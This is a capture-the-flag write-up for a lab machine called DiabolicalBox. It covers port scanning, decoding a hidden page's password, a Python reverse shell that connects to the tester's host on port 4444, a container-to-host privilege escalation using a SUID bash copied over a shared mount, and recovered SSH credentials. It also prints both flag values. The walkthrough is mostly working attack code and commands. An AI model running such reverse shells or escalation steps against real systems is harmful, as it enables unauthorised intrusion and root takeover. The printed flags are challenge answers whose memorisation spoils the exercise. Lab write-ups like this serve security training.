# DiabolicalBox

## Enumeration

```bash
└─$ nmap -A -p- -sC -T4 10.10.125.32
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 09:55 BST
Nmap scan report for 10.10.125.32
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Diabolical Box!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Exploitation

```bash
/admin
```
### I check the source code of the js login page and I discover an hidden page
password encoded = (dwdvdxdxdxeadxefdwdzdxeidxdudxeedxefdveodxefdwecdwemdxeedvendweqdxeddxeedxdtdweqdxdxdvegdxdxdxdxdvegdxdxdxeadxdzdwes)-> very-intricate-puzzle.html


### On this hidden page we can write python and execute it so i made a reverse shell
#### Python Reverse shell
```python
import	socket,subprocess,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.37.214",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
```

### The reverse shell gives me a shell in a docker container as root

## User FLAG

```cat user.txt``` : EPI{4_93n7L3m4n_n3v3r_L34v35_4_Pu22L3_uN50LV3D}

### I use a python script to decode the the hash to get the ssh credentials 

hershel:PlotTwistItWasHershelAllAlong

## Privilege Escalation

#### On the container :
```bash
cd /mnt/log
mkdir test-dir
chmod 777 test-dir
```
#### On the ssh access :
```bash
cd /var/log/test-dir
cp /bin/bash bash
```
#### On the container :
```bash
chown root:root bash
chmod 4755 bash
```

#### On the ssh access :
```bash
./bash -p
cd /root
```
# Root FLAG

```cat `ls` ```: EPI{D0Nt_9eT_D15c0uR49Ed_K0lleCT_j00r_Th0U9hT2_4ND_TRy_4941n}


## source 

https://shishirsubedi.com.np/thm/pythonp/ | Python Playground Box |
